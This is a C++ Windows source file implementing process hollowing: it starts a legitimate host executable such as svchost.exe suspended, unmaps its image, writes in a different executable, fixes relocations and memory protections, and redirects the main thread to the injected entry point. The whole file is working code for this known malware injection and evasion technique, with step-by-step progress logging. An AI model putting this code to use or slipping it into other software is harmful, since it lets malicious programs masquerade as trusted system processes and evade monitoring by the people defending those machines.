#include "stdafx.h"
#include "ProcessHollowed.h"

//////////////////////////////////////////////////////////////////////////

#define log$ printf

#ifdef _WIN64
#define Xxx Rcx
#else
#define Xxx Eax
#endif

//////////////////////////////////////////////////////////////////////////

static DWORD GetProcessPeb(HANDLE aProcessHandle, sdkext::PEB* aPeb)
{
    DWORD vDosError = NOERROR;

    for (;;)
    {
        auto vProcessBaseInfo = PROCESS_BASIC_INFORMATION();

        auto vStatus = sdkext::NtQueryInformationProcess(
            aProcessHandle,
            ProcessBasicInformation,
            &vProcessBaseInfo,
            sizeof(vProcessBaseInfo),
            nullptr);
        if (!NT_SUCCESS(vStatus))
        {
            sdkext::RtlSetLastWin32ErrorAndNtStatusFromNtStatus(vStatus);

            vDosError = GetLastError();
            break;
        }

        SIZE_T vReadBytes = 0;
        if (!ReadProcessMemory(
            aProcessHandle,
            vProcessBaseInfo.PebBaseAddress,
            aPeb,
            sizeof(*aPeb),
            &vReadBytes))
        {
            vDosError = GetLastError();
            break;
        }

        break;
    }

    return vDosError;
}

[[maybe_unused]] static DWORD SetProcessPeb(HANDLE aProcessHandle, sdkext::PEB* aPeb)
{
    DWORD vDosError = NOERROR;

    for (;;)
    {
        auto vProcessBaseInfo = PROCESS_BASIC_INFORMATION();

        auto vStatus = sdkext::NtQueryInformationProcess(
            aProcessHandle,
            ProcessBasicInformation,
            &vProcessBaseInfo,
            sizeof(vProcessBaseInfo),
            nullptr);
        if (!NT_SUCCESS(vStatus))
        {
            sdkext::RtlSetLastWin32ErrorAndNtStatusFromNtStatus(vStatus);

            vDosError = GetLastError();
            break;
        }

        SIZE_T vWriteBytes = 0;
        if (!WriteProcessMemory(
            aProcessHandle,
            vProcessBaseInfo.PebBaseAddress,
            aPeb,
            sizeof(*aPeb),
            &vWriteBytes))
        {
            vDosError = GetLastError();
            break;
        }

        break;
    }

    return vDosError;
}

[[maybe_unused]] static DWORD WriteProcessBreakPoint(HANDLE aProcessHandle, PVOID aBaseAddress)
{
    UINT8 vBreakPoint  = 0xCC;
    SIZE_T vWriteBytes = 0;
    if (!WriteProcessMemory(aProcessHandle, aBaseAddress, &vBreakPoint, sizeof(vBreakPoint), &vWriteBytes))
    {
        return GetLastError();
    }

    return NOERROR;
}

//////////////////////////////////////////////////////////////////////////

DWORD CreateProcessHollowed(
    HANDLE                  aUserToken,
    PHANDLE                 aNewToken,
    LPCWSTR                 aHollowApplicationPath,
    LPCWSTR                 aRealApplicationPath,
    LPCWSTR                 aArgs,
    LPSECURITY_ATTRIBUTES   aProcessAttributes,
    LPSECURITY_ATTRIBUTES   aThreadAttributes,
    BOOL                    aInheritHandles,
    DWORD                   aCreateionFlags,
    LPVOID                  aEnvironment,
    LPCWSTR                 aCurrentDirectory,
    LPSTARTUPINFOW          aStartupInfo,
    LPPROCESS_INFORMATION   aProcessInformation)
{
    DWORD vDosError = NOERROR;

    wchar_t*    vCmdline    = nullptr;

    HANDLE      vRealFile   = nullptr;
    UINT8*      vLocalImage = nullptr;

    sdkext::PEB*vPeb        = nullptr;
    CONTEXT*    vContext    = nullptr;
    for (;;)
    {
        if (nullptr == aHollowApplicationPath ||
            nullptr == aRealApplicationPath)
        {
            vDosError = ERROR_INVALID_PARAMETER;
            break;
        }

        auto CreateProcessInternal = (decltype(sdkext::CreateProcessInternalW)*)GetProcAddress(
            GetModuleHandleA("Kernel32.dll"), "CreateProcessInternalW");
        if (nullptr == CreateProcessInternal)
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Got CreateProcessInternal at 0x%IX\n", (size_t)CreateProcessInternal);

        // HollowPath Args
        // E.g C:\Windows\System32\svchost.exe -k LocalService
        auto vCmdlineChars = sizeof(R"("" )") + wcslen(aHollowApplicationPath) + (aArgs ? wcslen(aArgs) : 0);
        vCmdline = new wchar_t[vCmdlineChars] {};
        if (nullptr == vCmdline)
        {
            vDosError = ERROR_INSUFFICIENT_BUFFER;
            break;
        }
        if (aArgs)
        {
            StringCchPrintfW(vCmdline, vCmdlineChars, LR"(%s %s)", aHollowApplicationPath, aArgs);
        }
        else
        {
            StringCchCopyW(vCmdline, vCmdlineChars, aHollowApplicationPath);
        }
        log$("[+] Cmdline: %ls\n", vCmdline);

        vRealFile = CreateFile(
            aRealApplicationPath,
            GENERIC_READ, 0,
            nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,
            nullptr);
        if (INVALID_HANDLE_VALUE == vRealFile)
        {
            vRealFile = nullptr;
            vDosError = GetLastError();
            break;
        }
        log$("[+] Opend %ls, handle 0x%IX\n", aRealApplicationPath, (size_t)vRealFile);

        auto vLocalNtHeader = new IMAGE_NT_HEADERS{};
        if (nullptr == vLocalNtHeader)
        {
            vDosError = ERROR_INSUFFICIENT_BUFFER;
            break;
        }
        vDosError = image::FileImageNtHeader(vRealFile, vLocalNtHeader);
        if (NOERROR != vDosError)
        {
            delete vLocalNtHeader, vLocalNtHeader = nullptr;
            break;
        }
        auto vImageSize = vLocalNtHeader->OptionalHeader.SizeOfImage;
        auto vHeadersSize = vLocalNtHeader->OptionalHeader.SizeOfHeaders;

        delete vLocalNtHeader, vLocalNtHeader = nullptr;

        vLocalImage = new UINT8[vImageSize]{};
        if (nullptr == vLocalImage)
        {
            vDosError = ERROR_INSUFFICIENT_BUFFER;
            break;
        }
        log$("[+] Allocated Local Image 0x%X bytes\n", vImageSize);

        if (!SetFilePointerEx(vRealFile, {}, nullptr, FILE_BEGIN))
        {
            vDosError = GetLastError();
            break;
        }
        DWORD vReadBytes = 0;
        if (!ReadFile(
            vRealFile,
            vLocalImage,
            vHeadersSize,
            &vReadBytes,
            nullptr))
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Writed Local Image Headers at 0x%IX, Size 0x%X\n", (size_t)vLocalImage, vHeadersSize);

        vLocalNtHeader = ImageNtHeader(vLocalImage);
        if (nullptr == vLocalNtHeader)
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Local Image NtHeader at 0x%IX, EntryPoint 0x%X\n",
            (size_t)vLocalNtHeader, vLocalNtHeader->OptionalHeader.AddressOfEntryPoint);

        auto vBeginSectionHeader = (PIMAGE_SECTION_HEADER)(vLocalNtHeader + 1);
        auto vEndSectionHeader   = vBeginSectionHeader + vLocalNtHeader->FileHeader.NumberOfSections;
        for (auto vSectionHeader = vBeginSectionHeader; 
            vSectionHeader < vEndSectionHeader; 
            ++vSectionHeader)
        {
            auto vSection = (PIMAGE_SECTION_HEADER)((size_t)vLocalImage + vSectionHeader->VirtualAddress);

            log$("[+] Write Section %s Size 0x%X at 0x%IX\n", 
                vSectionHeader->Name, vSectionHeader->SizeOfRawData, (size_t)vSection);

            if (!SetFilePointerEx(vRealFile, { vSectionHeader->PointerToRawData }, nullptr, FILE_BEGIN))
            {
                vDosError = GetLastError();
                break;
            }
            if (!ReadFile(
                vRealFile,
                vSection,
                vSectionHeader->SizeOfRawData,
                &vReadBytes,
                nullptr))
            {
                vDosError = GetLastError();
                break;
            }
        }
        if (NOERROR != vDosError)
        {
            break;
        }
        log$("[+] Write Section Complete!\n");

        CloseHandle(vRealFile), vRealFile = nullptr;

        if (!CreateProcessInternal(
            aUserToken,
            nullptr,
            vCmdline,
            aProcessAttributes,
            aThreadAttributes,
            aInheritHandles,
            aCreateionFlags | CREATE_SUSPENDED,
            aEnvironment,
            aCurrentDirectory,
            aStartupInfo,
            aProcessInformation,
            aNewToken))
        {
            vDosError = GetLastError();
            break;
        }
        delete[] vCmdline, vCmdline = nullptr;
        log$("[+] CreateProcess Pid: %u, handle: 0x%IX\n",
            aProcessInformation->dwProcessId, (size_t)aProcessInformation->hProcess);
        
        vPeb = new sdkext::PEB{};
        vDosError = GetProcessPeb(aProcessInformation->hProcess, vPeb);
        if (vDosError != NOERROR)
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Process Image BaseAddress: 0x%IX\n", (size_t)vPeb->ImageBaseAddress);

        auto vStatus = sdkext::NtUnmapViewOfSection(aProcessInformation->hProcess, vPeb->ImageBaseAddress);
        if (!NT_SUCCESS(vStatus))
        {
            sdkext::RtlSetLastWin32ErrorAndNtStatusFromNtStatus(vStatus);

            vDosError = GetLastError();
            break;
        }
        log$("[+] Unmapping original section at 0x%IX.\n", (size_t)vPeb->ImageBaseAddress);

        auto vRemoteImage = VirtualAllocEx(
            aProcessInformation->hProcess,
            vPeb->ImageBaseAddress,
            vImageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (nullptr == vRemoteImage)
        {
            vDosError = GetLastError();
            break;
        }
        if (vRemoteImage != vPeb->ImageBaseAddress)
        {
            vDosError = ERROR_INSUFFICIENT_BUFFER;
            break;
        }
        log$("[+] Allocate Remote address at 0x%IX\n", (size_t)vRemoteImage);

        vDosError = image::ImageRelocateWithBias(
            vLocalImage,
            (size_t)vRemoteImage - (size_t)vLocalImage,
            NOERROR,
            ERROR_BAD_EXE_FORMAT,
            ERROR_BAD_EXE_FORMAT);
        if (NOERROR != vDosError)
        {
            break;
        }
        log$("[+] Relocation Local Image Complate!\n");

        vLocalNtHeader->OptionalHeader.ImageBase = (size_t)vRemoteImage;
        log$("[+] Fix Headers ImageBase to 0x%IX\n", (size_t)vRemoteImage);

        auto   vEntryPoint = (PVOID)((size_t)vPeb->ImageBaseAddress + vLocalNtHeader->OptionalHeader.AddressOfEntryPoint);
        delete vPeb, vPeb  = nullptr;

        if (!WriteProcessMemory(
            aProcessInformation->hProcess,
            vRemoteImage,
            vLocalImage,
            vImageSize,
            nullptr))
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Copy Local-Image to Remote-Image.\n");

        DWORD vProtect = PAGE_READONLY;
        if (!VirtualProtectEx(aProcessInformation->hProcess, vRemoteImage, vHeadersSize, vProtect, &vProtect))
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Fix Remote-Image Headers Memory Protect.\n");

        for (auto vSectionHeader = vBeginSectionHeader;
            vSectionHeader < vEndSectionHeader;
            ++vSectionHeader)
        {
            struct ProtectMapTable
            {
                DWORD SectionProtect;
                DWORD VirtualProtect;
            };
            static ProtectMapTable vProtectMapTable[] =
            {
                { IMAGE_SCN_MEM_READ,   PAGE_READONLY   },
                { IMAGE_SCN_MEM_WRITE,  PAGE_READWRITE  },
                { IMAGE_SCN_MEM_EXECUTE,PAGE_EXECUTE    },
                { IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE,     PAGE_READWRITE          },
                { IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE,   PAGE_EXECUTE_READ       },
                { IMAGE_SCN_MEM_WRITE| IMAGE_SCN_MEM_EXECUTE,   PAGE_EXECUTE_READWRITE  },
                { IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE, PAGE_EXECUTE_READWRITE}
            };

            if (0 == vSectionHeader->SizeOfRawData)
                continue;

            vProtect = PAGE_READONLY;
            for (const auto& vEntry : vProtectMapTable)
            {
                auto vSectionProtect = vSectionHeader->Characteristics & (IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
                if (vSectionProtect == vEntry.SectionProtect)
                {
                    vProtect = vEntry.VirtualProtect;
                    break;
                }
            }

            if (!VirtualProtectEx(
                aProcessInformation->hProcess, 
                (PVOID)((size_t)vRemoteImage + vSectionHeader->VirtualAddress), 
                vSectionHeader->SizeOfRawData, 
                vProtect,
                &vProtect))
            {
                vDosError = GetLastError();
                break;
            }
        }
        FlushInstructionCache(aProcessInformation->hProcess, vRemoteImage, vImageSize);
        log$("[+] Fix Remote-Image Sections Memory Protect.\n");       

#ifdef WRITE_BREAKPOINT
        vDosError = WriteProcessBreakPoint(aProcessInformation->hProcess, vEntryPoint);
        if (vDosError != NOERROR)
        {
            break;
        }
        log$("[+] Writing breakpoint.\n");
#endif

        vContext = new CONTEXT{};
        if (nullptr == vContext)
        {
            vDosError = ERROR_INSUFFICIENT_BUFFER;
            break;
        }
        vContext->ContextFlags = CONTEXT_INTEGER;

        if (!GetThreadContext(aProcessInformation->hThread, vContext))
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Got Thread Context at 0x%IX, Xxx 0x%IX\n", (size_t)vContext, (size_t)vContext->Xxx);
        vContext->Xxx = (size_t)vEntryPoint;

        if (!SetThreadContext(aProcessInformation->hThread, vContext))
        {
            vDosError = GetLastError();
            break;
        }
        log$("[+] Set Thread Context New Xxx 0x%IX\n", (size_t)vContext->Xxx);
        delete vContext, vContext = nullptr;

        if (!(aCreateionFlags & CREATE_SUSPENDED))
        {
            if (!ResumeThread(aProcessInformation->hThread))
            {
                vDosError = GetLastError();
                break;
            }
            log$("[+] Resume Thread id %u\n", aProcessInformation->dwThreadId);
        }

        log$("[+] Porcess Hollowed Complete!\n");
        break;
    }
    if (vContext)
    {
        delete vContext, vContext = nullptr;
    }
    if (vPeb)
    {
        delete vPeb, vPeb = nullptr;
    }
    if (vLocalImage)
    {
        delete[] vLocalImage, vLocalImage = nullptr;
    }
    if (vRealFile)
    {
        CloseHandle(vRealFile), vRealFile = nullptr;
    }
    if (vCmdline)
    {
        delete[] vCmdline, vCmdline = nullptr;
    }
    if (NOERROR != vDosError)
    {
        if (aProcessInformation->hProcess)
        {
            TerminateProcess(aProcessInformation->hProcess, vDosError);
            CloseHandle(aProcessInformation->hProcess);
            CloseHandle(aProcessInformation->hThread);
            *aProcessInformation = {};
        }
    }

    return SetLastError(vDosError), vDosError;
}
